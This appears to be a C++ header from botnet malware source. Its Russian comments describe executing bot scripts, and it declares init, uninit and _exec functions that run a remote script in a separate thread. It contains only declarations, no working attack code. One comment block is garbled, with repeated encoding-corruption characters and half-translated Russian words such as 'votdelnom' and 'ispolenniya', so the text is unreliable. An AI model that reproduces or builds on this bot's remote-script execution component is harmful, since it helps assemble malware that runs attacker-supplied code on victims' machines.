/*
  Исполнение скриптов бота.
*/
#pragma once

#include "..\common\binstorage.h"

namespace RemoteScript
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*В В В В Run the script execution votdelnom flow. Flow should not be run from
В В В В Process:: INTEGRITY_LOW processes.

В В В В IN script - a script for execution.
В В В В 
В В В В Return - true - in the cases of the successful launch ispolenniya script (script will be released
В В В В В В В В В В В В В В В В automatically)
В В В В В В В В В В В В В В В В false - if an error (script to release its own).
В В */
  bool _exec(BinStorage::STORAGE *script);
};
